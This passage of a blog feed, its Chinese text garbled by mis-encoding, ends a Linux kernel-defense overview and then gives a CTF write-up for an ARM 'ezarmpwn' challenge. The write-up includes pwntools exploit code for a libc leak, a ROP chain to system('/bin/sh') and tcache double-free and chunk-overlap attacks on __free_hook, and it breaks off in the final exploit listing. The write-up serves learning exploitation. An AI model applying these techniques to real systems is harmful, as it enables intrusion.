Moduleï¼‰é€šè¿‡hookçš„æ–¹æ³•é”å®šå†…æ ¸ï¼Œé˜»æ­¢ä¸€äº›é«˜å±æ“ä½œã€‚æ¯”å¦‚åŠ è½½æœªç­¾åçš„æ¨¡å—ï¼Œè®¿é—®ç‰¹æ®Šæ–‡ä»¶<code>/dev/port</code>ç­‰ç­‰ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/791863/" target="_blank" rel="noopener">https://lwn.net/Articles/791863/</a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å†…æ ¸é˜²å¾¡æœºåˆ¶å¤šç§å¤šæ ·ï¼Œå¤§ä½“ä¸Šè¾ƒä¸ºé€šç”¨çš„æ€è·¯æœ‰é™åˆ¶æƒé™çš„ä»¥SMEPï¼ŒSMAPä¸ºä»£è¡¨ï¼Œæœ‰åšåœ°å€ç©ºé—´åˆ†ç¦»çš„ï¼Œæœ‰é€šè¿‡éšæœºåŒ–å¢åŠ é¢„æµ‹éš¾åº¦çš„ï¼Œæœ‰æ’å…¥ç‰¹æ®Šæ•°æ®å—æˆ–è€…æ£€æŸ¥è¿”å›åœ°å€é˜²å¾¡ç¼“å†²åŒºæº¢å‡ºçš„ï¼Œæœ‰æ“¦é™¤æ··æ·†æ•°æ®é˜²æ­¢æ³„éœ²çš„ã€‚æœ€åå¯ä»¥çœ‹åˆ°Linuxå†…æ ¸çš„å¾ˆå¤šä¼˜ç§€çš„é˜²å¾¡æœºåˆ¶éƒ½æ¥è‡ªäº<code>PaX/Grsecurity</code>ï¼Œè¯¥ç»„ç»‡æä¾›çš„é˜²å¾¡æ€è·¯æ¯”å„å¤§å‚å•†é¢†å…ˆå¥½å‡ å¹´ï¼Œåœ¨å­¦ä¹ ä¹‹ä½™ä¸ç”±å¾—æ•¬ä½©è¿™20å¹´æ¥ä»–ä»¬ä¸ºå†…æ ¸é˜²å¾¡åšå‡ºçš„æ°å‡ºè´¡çŒ®ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ayesawyer.github.io/2019/08/16/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Android-Linux/" target="_blank" rel="noopener">https://ayesawyer.github.io/2019/08/16/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Android-Linux/</a></p><p><a href="https://www.jianshu.com/p/4bc65d4477d3" target="_blank" rel="noopener">https://www.jianshu.com/p/4bc65d4477d3</a></p><p><a href="https://github.com/bsauce/kernel-security-learning" target="_blank" rel="noopener">https://github.com/bsauce/kernel-security-learning</a></p><p><a href="https://github.com/hardenedlinux/grsecurity-101-tutorials" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials</a></p><p><a href="https://kernsec.org/wiki/index.php/Main_Page" target="_blank" rel="noopener">https://kernsec.org/wiki/index.php/Main_Page</a></p><p><a href="https://hardenedlinux.github.io/announcement/2017/04/29/hardenedlinux-statement2.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/announcement/2017/04/29/hardenedlinux-statement2.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ–‡ç« é¦–å‘äºå®‰å…¨å®¢  &lt;a href=&quot;https://www.anquanke.com/post/id/238363&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/238363&lt;/a&gt;&lt;/p
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Kernel" scheme="https://hurricane618.me/tags/Kernel/"/>
    
      <category term="Linux" scheme="https://hurricane618.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘ IoTé—¯å…³èµ› 2020 pwn3 ezarmpwn</title>
    <link href="https://hurricane618.me/2020/12/17/2020xhlj-iot-pwn/"/>
    <id>https://hurricane618.me/2020/12/17/2020xhlj-iot-pwn/</id>
    <published>2020-12-17T13:22:10.000Z</published>
    <updated>2020-12-17T13:22:10.332Z</updated>
    
    <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ <a href="https://www.anquanke.com/post/id/224972" target="_blank" rel="noopener">https://www.anquanke.com/post/id/224972</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ‰“äº†å®‰æ’ä¸¾åŠçš„è¥¿æ¹–è®ºå‰‘æ¯”èµ›ï¼Œé¢˜ç›®éƒ½æ˜¯è·‘åœ¨ä¸€ä¸ªå¼€å‘æ¿ä¸Šçš„ï¼Œé€šè¿‡æ•°æ®çº¿è¿æ¥å¼€å‘æ¿çš„otgæ¥å£èƒ½è®¿é—®é¢˜ç›®ç¯å¢ƒã€‚pwné¢˜ç›®ä¸€å…±æœ‰ä¸‰é“ï¼Œå…¶ä¸­æœ‰ä¸€é“é¢˜ç›®å› ä¸ºé€»è¾‘ä¸Šçš„é—®é¢˜å¯¼è‡´èƒ½æ¯”è¾ƒç®€å•çš„è·å¾—flagï¼Œå¦å¤–ä¸€é“é¢˜ç›®æ˜¯boaæœåŠ¡å™¨åœ¨å¤„ç†httpè®¤è¯è¿‡ç¨‹ä¸­ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºã€‚æˆ‘ä»¬è¿™é‡Œåˆ†æçš„æ˜¯è¿™æ¬¡æ¯”èµ›çš„ç¬¬ä¸‰é“pwné¢˜ezarmpwnã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é€šè¿‡fileå’Œchecksecèƒ½å¤ŸçŸ¥é“ç¨‹åºä¸º32ä½çš„armå°ç«¯ç¨‹åºï¼Œå¼€å¯NXä¿æŠ¤ï¼Œæ²¡æœ‰PIEå’Œcanaryä¿æŠ¤ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/1.png"><p>ä¸»åŠæ–¹ç»™å‡ºçš„libcä¸º2.30ï¼ŒæŠŠlibcè§£å‹çš„æ–‡ä»¶å¤¹å’Œé¢˜ç›®æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ï¼Œä½¿ç”¨<code>qemu-arm -L ./ ./pwn3</code>æ‰§è¡Œç¨‹åºï¼Œèƒ½çœ‹åˆ°é¦–å…ˆè¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä¹‹åè¿›å…¥åˆ°èœå•é€‰é¡¹ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/2.png"><p>playé€‰é¡¹æœ‰ä¸¤ä¸ªå­åŠŸèƒ½ï¼Œaddå’Œdeleteï¼Œèƒ½åˆ†é…chunkå’Œé‡Šæ”¾chunkï¼›ç§äººä¿¡æ¯æ˜¯è¾“å‡ºç”¨æˆ·åå’Œå¯†ç çš„å†…å®¹ï¼›ä¿®æ”¹å¯†ç è¾“å…¥å­—ç¬¦ä¸²ä¿®æ”¹åŸå§‹çš„å¯†ç ï¼›é€‰é¡¹4ä¼šé€€å‡ºç¨‹åºï¼Œä»åŠŸèƒ½ä¸Šçœ‹æ˜¯ä¸€é“å…¸å‹çš„libcèœå•é¢˜ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é“é¢˜çš„æ¼æ´éå¸¸å¤šï¼Œæœ‰ä¸€äº›æ¼æ´å¾ˆæœ‰å¹²æ‰°æ€§ã€‚é¦–å…ˆç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å›ºå®šé•¿åº¦çš„bufferï¼Œå¤§å°å¦‚ä¸‹ï¼š</p><img src="/2020/12/17/2020xhlj-iot-pwn/3.png"><h3 id="æ ˆæº¢å‡º1"><a href="#æ ˆæº¢å‡º1" class="headerlink" title="æ ˆæº¢å‡º1"></a>æ ˆæº¢å‡º1</h3><p>å¯†ç å’Œç”¨æˆ·åè¢«å¸¦è¿›æ³¨å†Œå‡½æ•°ä¸­ï¼Œè¿™é‡Œè¾“å…¥çš„ç”¨æˆ·åç›´æ¥é€šè¿‡scanfè¿›å…¥srcæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œç›´æ¥æº¢å‡ºã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/4.png"><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>åœ¨æ ˆæº¢å‡ºä¸‹æ–¹æœ‰ä¸€ä¸ªoff by nullçš„æ¼æ´ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¾“å…¥çš„å¯†ç ä¸­æ²¡æœ‰<code>\n</code>å°±ä¼šæŒç»­ç§»åŠ¨æŒ‡é’ˆï¼Œæœ€ååœ¨æœ‰<code>\n</code>çš„åœ°æ–¹èµ‹å€¼ä¸º0ï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´å¤ªéš¾åˆ©ç”¨éå¸¸é¸¡è‚‹ã€‚</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>åœ¨playçš„é€‰é¡¹ä¸­çš„ç»“æ„ä¸ºä¸‹æ–¹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span>* content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨deleteæ“ä½œä¸­æ²¡æœ‰å¯¹æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œä¸è¿‡è¿™é‡Œçš„ç»“æ„ä½“æ˜¯åœ¨äº‹å…ˆåˆ†é…å¥½çš„ç©ºé—´ä¸­ï¼Œæ‰€ä»¥è¿™ä¸ªUAFåˆ©ç”¨éš¾åº¦è¾ƒå¤§ï¼Œæˆ‘èƒ½æƒ³åˆ°çš„æ˜¯åˆ©ç”¨double freeï¼Œä½†æ˜¯åœ¨libc 2.30çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨éš¾åº¦å¾ˆå¤§ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/5.png"><h3 id="æ ˆæº¢å‡º2"><a href="#æ ˆæº¢å‡º2" class="headerlink" title="æ ˆæº¢å‡º2"></a>æ ˆæº¢å‡º2</h3><p>æˆ‘ä»¬çŸ¥é“å¯†ç çš„bufferé•¿åº¦ä¸º40ï¼Œè¿™é‡Œstrncpyç›´æ¥å¤åˆ¶äº†0x48ï¼ˆ72ï¼‰é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œç›´æ¥æº¢å‡ºã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/6.png"><p>ä»¥ä¸Šå°±æ˜¯èƒ½å¤Ÿè§‚å¯Ÿåˆ°çš„æ¼æ´äº†ï¼Œè™½ç„¶æˆ‘ä»¬æœ‰ä¸¤ä¸ªéå¸¸æœ‰ç”¨çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ³„éœ²å‡ºlibcåœ°å€ï¼Œæ‰èƒ½ç»§ç»­å®Œæˆåˆ©ç”¨ï¼Œä¸ç®¡æ˜¯è¿›è¡ŒROPè¿˜æ˜¯åˆ©ç”¨UAFå‘<code>__free_hook</code>å†™åœ°å€éƒ½æ˜¯éœ€è¦libcåœ°å€çš„ï¼Œæ‰€ä»¥æ‹¿åˆ°libcåœ°å€æˆä¸ºäº†æˆ‘ä»¬çš„é¦–è¦ç›®æ ‡ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æœ€å¼€å§‹ï¼Œæˆ‘çš„æƒ³æ³•æ˜¯ç›´æ¥åˆ©ç”¨ç¬¬ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´è¿›è¡ŒROPï¼Œä¹Ÿæ‰¾åˆ°äº†ä¸€äº›gadgetï¼Œæœ€åå‘ç°æ­¤è·¯ä¸é€šï¼Œç¨‹åºæœ¬èº«çš„gadgetååˆ†å°‘å†åŠ ä¸Šç¨‹åºçš„å‡½æ•°gotåœ°å€éƒ½å¸¦æœ‰<code>0x20</code>ï¼Œè¿™ä¸ªå­—ç¬¦åœ¨scanfçš„æ—¶å€™å›äº§ç”Ÿæˆªæ–­ï¼Œå¯¼è‡´ropå¤±è´¥ã€‚æ‰€ä»¥æ²¡æœ‰åŠæ³•åƒx86é‚£æ ·ç”¨putsç­‰æ³„éœ²å‡½æ•°è¾“å‡ºå‡½æ•°åœ°å€æ¥è®¡ç®—å¾—åˆ°libcåœ°å€ã€‚</p><p>é‚£ä¹ˆå¦å¤–ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´åˆå¦‚ä½•å‘¢ï¼Ÿåˆ†æä¹‹åå‘ç°åªèƒ½æ§åˆ¶PCï¼Œæ²¡æœ‰è¶³å¤Ÿçš„æº¢å‡ºé•¿åº¦æ¥å®ŒæˆROPã€‚äºæ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™ï¼Œæˆ‘å°±é™·å…¥äº†ç»æœ›ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥è·å–åˆ°libcå‘¢ï¼Ÿåœ¨å‚è€ƒäº†<code>pzhxbz</code>å¸ˆå‚…çš„expä¹‹åæç„¶å¤§æ‚Ÿï¼ŒåŸæ¥å¯ä»¥åœ¨æ ˆä¸Šæ‰¾libcåœ°å€é€šè¿‡strncpyè¿å¸¦ç€æ‹·è´åˆ°passwordçš„bufferä¸­ï¼Œéšååˆ©ç”¨è¾“å‡ºä¿¡æ¯åŠŸèƒ½æ³„éœ²å­—ç¬¦ä¸²è·å¾—libcåœ°å€ã€‚çœ‹æ¥ä»¥ååœ¨å‡ºç°äº†è¾“å‡ºåŠŸèƒ½çš„åœ°æ–¹éƒ½è¦ç•™ä¸ªå¿ƒçœ¼ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æœ‰æ–¹æ³•è¾“å‡ºæ ˆä¸Šçš„libcåœ°å€ä¿¡æ¯ã€‚</p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>åœ¨readåˆ°ä¸´æ—¶bufferæ ˆç©ºé—´ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰libcç›¸å…³çš„å‡½æ•°åœ°å€ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬å¡«å……40å­—èŠ‚çš„æ•°æ®ï¼Œåœ¨æ‰§è¡Œstrncpyçš„æ—¶å€™å°±ä¼šè¿å¸¦ç€è¿™ä¸ªåœ°å€ä¸€èµ·è¿›å…¥paaswordä¸­ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/7.png"><p>æŸ¥çœ‹å®Œæˆstrncpyä¹‹åçš„çš„passwordï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æŠŠåé¢çš„libcåœ°å€ä¸€èµ·è¿å¸¦å¤åˆ¶è¿›bufferä¸­ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/8.png"><p>æˆ‘ä»¬è°ƒç”¨è¾“å‡ºä¿¡æ¯çš„åŠŸèƒ½å°±å¯ä»¥çœ‹åˆ°æ³„éœ²å‡ºçš„libcåœ°å€ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/9.png"><p>å‡å»libcçš„åŸºåœ°å€æˆåŠŸè·å¾—ç›¸å¯¹äºlibcçš„åç§»ã€‚</p><img src="/2020/12/17/2020xhlj-iot-pwn/10.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">info()</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">libc_addr = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x32248</span></span><br><span class="line">print(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br></pre></td></tr></table></figure><h3 id="control-pc-and-rop"><a href="#control-pc-and-rop" class="headerlink" title="control pc and rop"></a>control pc and rop</h3><p>æœ‰äº†libcåœ°å€ä¹‹åï¼Œè¿™ä¸‹å°±éå¸¸å®¹æ˜“äº†ï¼Œåˆ©ç”¨ç¬¬äºŒä¸ªæ ˆæº¢å‡ºæ¼æ´æ§åˆ¶PCåˆ°æœ€å¼€å§‹çš„åœ°æ–¹è§¦å‘ç¬¬ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´å®Œæˆropã€‚è¿™é‡Œropçš„æ€è·¯æ˜¯åˆ©ç”¨libcåœ°å€å¾—åˆ°systemå’Œ/bin/shï¼Œä½¿ç”¨gadgetæ‰§è¡Œsystemå‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.text:000A1A5C                 MOV     R0, R4</span></span><br><span class="line"><span class="comment">#0x00010784 : pop &#123;r4, pc&#125;</span></span><br><span class="line">change(<span class="string">b'a'</span>*<span class="number">64</span> + p32(<span class="number">0x10e70</span>))</span><br><span class="line">io.sendlineafter(<span class="string">'choice &gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line">payload = <span class="string">b'c'</span> * <span class="number">0x1c</span> + p32(<span class="number">0x10784</span>) + p32(bin_sh) + p32(libc_addr + <span class="number">0xa1a5c</span>) + p32(system)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬æº¢å‡ºçš„éƒ¨åˆ†è¦†ç›–äº†passwordçš„bufferï¼Œå› æ­¤åœ¨è¾“å…¥å¯†ç çš„æ—¶å€™å¿…é¡»æ§åˆ¶è¾“å…¥çš„å†…å®¹ï¼Œè®©å­—ç¬¦ä¸²å¤åˆ¶ä¹‹åçš„rop chainä¾æ—§å¯ä»¥è¿è¡Œã€‚åœ¨libcä¸­æ‰¾åˆ°å¦‚ä¸‹çš„gadgetï¼š</p><img src="/2020/12/17/2020xhlj-iot-pwn/11.png"><p>è™½ç„¶æœ€åä¸€ä¸ªå­—èŠ‚æœ‰å·®å¼‚ä½†æŒ‡ä»¤å´æ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·æˆ‘ä»¬è¾“å…¥ç©ºå¯†ç æœ€ç»ˆåœ¨å­—ç¬¦ä¸²å¤åˆ¶æ—¶ä¹Ÿåªä¼šå¤åˆ¶ä¸€ä¸ªç©ºå­—èŠ‚ï¼Œå¯¹æˆ‘ä»¬çš„rop chainå°†ä¸ä¼šæœ‰ä»»ä½•å½±å“ã€‚</p><p>æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™æœ‰å¾ˆå¤šåå­—ç¬¦çš„å¹²æ‰°ï¼Œæ¯”å¦‚<code>0x0a</code>å’Œ<code>0x20</code>ï¼Œæ¯”è¾ƒéš¾å—çš„æ˜¯systemå‡½æ•°çš„åœ°å€ä¸­æ°å¥½å¸¦æœ‰<code>0x20</code>æ‰€ä»¥æ•´ä¸ªexpåœ¨æœ¬åœ°æ˜¯æ²¡æœ‰åŠæ³•å¤ç°çš„ï¼Œåªèƒ½åœ¨å¼€å‘æ¿ä¸Šèƒ½æˆåŠŸã€‚</p><h3 id="UAF-1"><a href="#UAF-1" class="headerlink" title="UAF"></a>UAF</h3><p>åœ¨å®Œæˆæ³„éœ²libcåœ°å€ä¹‹åï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ä¸Šé¢çš„æ ˆæº¢å‡ºæ”»å‡»æ–¹æ³•ï¼Œè½¬è€Œåˆ©ç”¨uafæ¼æ´å®Œæˆå †åˆ©ç”¨çš„æ”»å‡»ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªåˆ©ç”¨æ€è·¯ï¼Œä¸€ä¸ªæ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°çš„double freeï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æ„é€ å‡ºchunk overlapã€‚</p><p>å› ä¸ºæœ‰tcacheï¼Œè¦æ„é€ double freeéœ€è¦å…ˆæŠŠtcacheå¡«æ»¡ï¼Œç„¶åä½¿ç”¨ä¹‹å‰freeä¸€ä¸ªå†freeå¦å¤–ä¸€ä¸ªæœ€åå†æ¬¡freeç¬¬ä¸€æ¬¡freeçš„chunkã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æœ‰tcacheçš„æƒ…å†µä¸‹ä¼šä¼˜å…ˆåˆ†é…tcacheä¸­çš„chunkï¼Œæ‰€ä»¥å†æŠŠtcacheé“¾è¡¨ä¸­çš„7ä¸ªchunkå…¨éƒ¨åˆ†é…ï¼Œåœ¨è¿™ä¹‹åç”³è¯·çš„ç¬¬ä¸€ä¸ªchunkä¿®æ”¹å®ƒçš„æŒ‡é’ˆè®©å…¶æŒ‡å‘æˆ‘ä»¬æƒ³å†™å…¥çš„åœ°å€<code>__free_hook</code>ï¼Œå†åˆ†é…ä¸‰æ¬¡ï¼Œç¬¬ä¸‰æ¬¡å†™å…¥systemåœ°å€åˆ°<code>__free_hook</code>ä¸­ï¼Œæœ€åéšä¾¿freeä¸€ä¸ªå†…å®¹ä¸º<code>/bin/sh\x00</code>çš„chunkå³å¯getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">20</span>+i,<span class="number">0x30</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">30</span>,<span class="number">0x30</span>,p32(libc+e.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">print(hex(libc+e.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">31</span>,<span class="number">0x30</span>,<span class="string">'test'</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="number">0x30</span>,<span class="string">'test'</span>)</span><br><span class="line">add(<span class="number">34</span>,<span class="number">0x30</span>,p32(libc+e.symbols[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">11</span>)</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªæ€è·¯æ˜¯æ„é€ å‡ºchunk overlapï¼Œç”³è¯·ä¸¤ä¸ªè¾ƒå¤§çš„chunkï¼Œé‡Šæ”¾ä¹‹åç”³è¯·ä¸€ä¸ªæ›´å¤§çš„chunkï¼Œä½¿å¾—ä¹‹å‰è¾ƒå°çš„ä¸¤ä¸ªchunkåˆå¹¶ï¼Œè¿™æ ·æ–°ç”³è¯·çš„å¤§chunkèƒ½å¤Ÿä¿®æ”¹åˆ°å…¶ä¸­ä¸€ä¸ªå°chunkçš„headerã€‚æŠŠheaderæ”¹æˆtcacheçš„èŒƒå›´ï¼Œfreeè¿™ä¸ªchunkï¼Œè®©å®ƒè¿›å…¥tcacheä¸­ï¼Œè¿™ä¸ªæ—¶å€™é‡å¤é‡Šæ”¾å’Œåˆ†é…å¤§chunkå°±èƒ½ä¿®æ”¹tcacheçš„æŒ‡é’ˆï¼Œå‰©ä¸‹æ¥çš„æ“ä½œå’Œä¸Šé¢çš„ç›¸åŒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">   add(i,<span class="number">0x40</span>,<span class="string">"aaaa\n"</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">6</span>,<span class="string">"a\n"</span>) <span class="comment">#0x10</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">6</span>,<span class="string">"a\n"</span>) <span class="comment">#0x10</span></span><br><span class="line">delete(<span class="number">15</span>) </span><br><span class="line">delete(<span class="number">14</span>) <span class="comment">#tcache[0x10]=14-&gt;15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">   delete(<span class="number">8</span>-i) <span class="comment">#unsorted bin 0-&gt;1 </span></span><br><span class="line">free_hook = libc + <span class="number">0x1479cc</span></span><br><span class="line">system    = libc + <span class="number">0x3a028</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x40</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0x39</span>)+<span class="string">"\n"</span>) <span class="comment">#overchunk</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#tcache[0x10] = 1-&gt;14-&gt;15</span></span><br><span class="line">delete(<span class="number">9</span>)  </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x40</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(free_hook)*<span class="number">3</span>+p32(<span class="number">0x39</span>)+p32(libc+<span class="number">0x1479cc</span>)+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">8</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">8</span>,p32(libc+<span class="number">0x3a028</span>)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="comment"># print hex(libc+0x1479cc)</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h2><p>è¿™æ˜¯æ ˆæº¢å‡ºçš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 